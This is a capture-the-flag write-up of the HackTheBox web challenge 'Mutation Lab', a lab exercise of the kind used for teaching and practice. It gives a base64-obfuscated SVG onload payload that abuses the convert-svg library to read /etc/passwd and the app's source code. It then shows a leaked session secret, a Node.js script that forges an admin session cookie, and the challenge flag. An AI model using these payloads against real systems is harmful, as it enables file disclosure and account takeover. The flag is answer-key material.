---
Category:
  - Web
Difficulty: Medium
Platform: HackTheBox
Status: 3. Complete
tags:
  - LFI
  - convert-svg
  - forging-cookies
  - nodejs
  - path-traversal
  - Linux
---
>[!quote]
> *One of the renowned scientists in the research of cell mutation, Dr. Rick, was a close ally of Draeger. The by-products of his research, the mutant army wrecked a lot of havoc during the energy-crisis war. To exterminate the leftover mutants that now roam over the abandoned areas on the planet Vinyr, we need to acquire the cell structures produced in Dr. Rick's mutation lab. Ulysses managed to find a remote portal with minimal access to Dr. Rick's virtual lab. Can you help him uncover the experimentations of the wicked scientist?*


# Set up

- Code or test environment is not provided

# Information Gathering

## The application at-a-glance 🔍

Login and registration page:

![Untitled](../../zzz_res/attachments/Mutation%20Lab%203541e65977024bc790ee974c481cc75a.png)

Registered an account and enumerated the internal area:

```
POST /api/register HTTP/1.1
Host: 159.65.59.5:30872
Connection: keep-alive
Content-Length: 43
User-Agent: USR_ozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://159.65.59.5:30872
Referer: http://159.65.59.5:30872/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJ1c2VybmFtZSI6InRlc3QifQ==; session.sig=XgGOoiot_fWo-RqRnE9KGES0Ak0

{"username":"maoutis","password":"maoutis"}
```

```
POST /api/login HTTP/1.1
Host: 159.65.59.5:30872
Connection: keep-alive
Content-Length: 43
User-Agent: USR_ozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://159.65.59.5:30872
Referer: http://159.65.59.5:30872/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJ1c2VybmFtZSI6InRlc3QifQ==; session.sig=XgGOoiot_fWo-RqRnE9KGES0Ak0

{"username":"maoutis","password":"maoutis"}

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 46
ETag: W/"2e-FCTfdnBNtsqc3wjjuhAwgZEEoU8"
Set-Cookie: session=eyJ1c2VybmFtZSI6Im1hb3V0aXMifQ==; path=/; httponly
Set-Cookie: session.sig=70TxHPv6O9FMkh4rZ15iQsMQ-AM; path=/; httponly
Date: Mon, 18 Jul 2022 14:29:14 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

![Untitled](../../zzz_res/attachments/Mutation%20Lab%203541e65977024bc790ee974c481cc75a%201.png)

Export cell structure:

![Untitled](../../zzz_res/attachments/Mutation%20Lab%203541e65977024bc790ee974c481cc75a%202.png)

![Untitled](../../zzz_res/attachments/Mutation%20Lab%203541e65977024bc790ee974c481cc75a%203.png)

# The Bug

[https://github.com/neocotic/convert-svg/issues/81](https://github.com/neocotic/convert-svg/issues/81)

[https://github.com/neocotic/convert-svg/issues/84](https://github.com/neocotic/convert-svg/issues/84)

[https://github.com/neocotic/convert-svg/issues/86](https://github.com/neocotic/convert-svg/issues/86)

```
POST /api/export HTTP/1.1
Host: 159.65.59.5:30872
Content-Length: 404
User-Agent: USR_ozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://159.65.59.5:30872
Referer: http://159.65.59.5:30872/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJ1c2VybmFtZSI6InVzZXIifQ==; session.sig=Xu_rjB4ONsGxnu1Hfe5GdUaEuyY
Connection: close

{"svg":"<svg onload=eval(atob(this.id)) id='ZG9jdW1lbnQud3JpdGUoJzxzdmctZHVtbXk+PC9zdmctZHVtbXk+PGlmcmFtZSBzcmM9ImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwMHB4Ij48L2lmcmFtZT48c3ZnIHZpZXdCb3g9IjAgMCAyNDAgODAiIGhlaWdodD0iMTAwMCIgd2lkdGg9IjEwMDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRleHQgeD0iMCIgeT0iMCIgY2xhc3M9IlJycnJyIiBpZD0iZGVtbyI+ZGF0YTwvdGV4dD48L3N2Zz4nKTs='></svg>"
}
```

[CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=Wkc5amRXMWxiblF1ZDNKcGRHVW9Kenh6ZG1jdFpIVnRiWGsrUEM5emRtY3RaSFZ0YlhrK1BHbG1jbUZ0WlNCemNtTTlJbVpwYkdVNkx5OHZaWFJqTDNCaGMzTjNaQ0lnZDJsa2RHZzlJakV3TUNVaUlHaGxhV2RvZEQwaU1UQXdNSEI0SWo0OEwybG1jbUZ0WlQ0OGMzWm5JSFpwWlhkQ2IzZzlJakFnTUNBeU5EQWdPREFpSUdobGFXZG9kRDBpTVRBd01DSWdkMmxrZEdnOUlqRXdNREFpSUhodGJHNXpQU0pvZEhSd09pOHZkM2QzTG5jekxtOXlaeTh5TURBd0wzTjJaeUkrUEhSbGVIUWdlRDBpTUNJZ2VUMGlNQ0lnWTJ4aGMzTTlJbEp5Y25KeUlpQnBaRDBpWkdWdGJ5SStaR0YwWVR3dmRHVjRkRDQ4TDNOMlp6NG5LVHM9)

![Untitled](../../zzz_res/attachments/Mutation%20Lab%203541e65977024bc790ee974c481cc75a%204.png)

# Exploitation

Leaked the application source code:

```json
{"svg":"<svg onload=eval(atob(this.id)) id='ZG9jdW1lbnQud3JpdGUoJzxzdmctZHVtbXk+PC9zdmctZHVtbXk+PGlmcmFtZSBzcmM9ImZpbGU6Ly8vYXBwL3JvdXRlcy9pbmRleC5qcyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwMHB4Ij48L2lmcmFtZT48c3ZnIHZpZXdCb3g9IjAgMCAyNDAgODAiIGhlaWdodD0iMTAwMCIgd2lkdGg9IjEwMDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRleHQgeD0iMCIgeT0iMCIgY2xhc3M9IlJycnJyIiBpZD0iZGVtbyI+ZGF0YTwvdGV4dD48L3N2Zz4nKTs='></svg>"
}
```

![Untitled](../../zzz_res/attachments/Mutation%20Lab%203541e65977024bc790ee974c481cc75a%205.png)

Leaked index.js

![Untitled](../../zzz_res/attachments/Mutation%20Lab%203541e65977024bc790ee974c481cc75a%206.png)

Leaked SESSION_SECRET_KEY: `fc8c7ef845baff7935591112465173e7`

![Untitled](../../zzz_res/attachments/Mutation%20Lab%203541e65977024bc790ee974c481cc75a%207.png)

Wrote a simple Node.JS script to generate and admin session cookie:

```jsx
var express = require('express')
const cookieSession = require('cookie-session');

var server = express()

server.use(cookieSession({
  name: "session",
  keys: ['fc8c7ef845baff7935591112465173e7'],
  Maxage: 20 * 60 * 1000 // valid for 20 minutes
}));

server.get('/', function (req, res, next) {
  // Update views
  req.session.username = "admin"

  // Write response
  res.end(req.session.username + ' views')
})

console.log('Up and running on port 1337...');
server.listen(1337);
```

![Untitled](../../zzz_res/attachments/Mutation%20Lab%203541e65977024bc790ee974c481cc75a%208.png)

Updated the cookies against the target and obtained the flag:

![Untitled](../../zzz_res/attachments/Mutation%20Lab%203541e65977024bc790ee974c481cc75a%209.png)

# Flag

>[!success]
>`HTB{fr4m3d_s3cr37s_4nd_f0rg3d_entr13s}`